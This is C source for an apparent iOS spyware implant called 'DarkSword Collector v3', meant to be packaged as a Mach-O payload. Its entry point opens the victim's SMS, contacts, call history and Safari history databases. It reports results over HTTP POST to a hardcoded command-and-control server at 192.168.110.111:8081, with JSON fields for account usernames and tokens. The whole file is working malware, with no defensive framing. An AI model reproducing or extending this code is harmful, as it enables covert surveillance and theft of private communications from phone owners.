/**
 * DarkSword Collector v3 - Standard C edition
 * Uses libc functions instead of raw syscalls
 * Compiled with -nostdlib removed so PLT resolves via MachOPayloadBuilder
 */
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define C2_HOST "192.168.110.111"
#define C2_PORT 8081
#define BUF_SIZE 16384

static void _http_post(const char *body, int body_len) {
    char http[4096];
    int h = 0;
    
    h += snprintf(http + h, sizeof(http) - h,
        "POST /api/v1/c2/report HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n",
        C2_HOST, C2_PORT, body_len);
    
    if (h + body_len < (int)sizeof(http)) {
        memcpy(http + h, body, body_len);
        h += body_len;
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return;
    }
    send(sock, http, h, 0);
    close(sock);
}

static void _report(const char *platform, const char *username, const char *token) {
    char body[2048];
    snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
        "\"data\":{\"platform\":\"%s\",\"username\":\"%s\",\"token\":\"%s\"}}",
        platform, username, token);
    _http_post(body, strlen(body));
}

static void _collect_file(const char *path, const char *platform) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        char buf[512];
        snprintf(buf, sizeof(buf),
            "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
            "\"data\":{\"platform\":\"%s\",\"username\":\"access_denied\",\"token\":\"%s\"}}",
            platform, path);
        _http_post(buf, strlen(buf));
        return;
    }
    
    char data[BUF_SIZE];
    int n = read(fd, data, sizeof(data) - 1);
    close(fd);
    if (n <= 0) n = 0;
    data[n] = 0;
    
    char body[512];
    snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
        "\"data\":{\"platform\":\"%s\",\"username\":\"read_success\",\"token\":\"%d bytes\"}}",
        platform, n);
    _http_post(body, strlen(body));
}

/* Entry point for MachOPayloadBuilder */
void ds_start(void) {
    _report("RawCollector", "started", "v3");
    _collect_file("/var/mobile/Library/SMS/sms.db", "SMS");
    _collect_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
    _collect_file("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
    _collect_file("/var/mobile/Library/Safari/History.db", "Safari");
    _report("RawCollector", "done", "all_files_attempted");
}